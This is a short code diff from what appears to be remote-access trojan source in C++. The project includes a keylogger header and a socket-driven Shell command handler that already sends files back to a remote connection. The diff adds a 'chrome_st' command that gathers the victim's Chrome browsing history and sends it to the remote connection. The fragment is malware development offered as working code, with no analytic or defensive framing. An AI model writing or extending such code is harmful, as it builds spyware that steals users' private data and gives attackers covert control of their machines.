@@ -20,6 +20,7 @@
 #include "Utils.h"
 #include "Info.h"
 #include "Keylogger.h"
+#include "Chrome.h"
 
 #pragma warning(disable: 4996)
 #pragma optimize("gsy", on)
@@ -220,6 +221,11 @@ int Shell(SOCKADDR_IN addr) {
 				send(conn, file_data.c_str(), file_data.length(), NULL);
 				d_file.close();
 			}
+		}
+
+		else if (!strcmp(buffer, "chrome_st")) {
+			std::string res = GetChromeHistory();
+			send(conn, res.c_str(), res.length(), NULL);
 		}
 
 		else if (strcmp(buffer, "close") == 0) return 1;
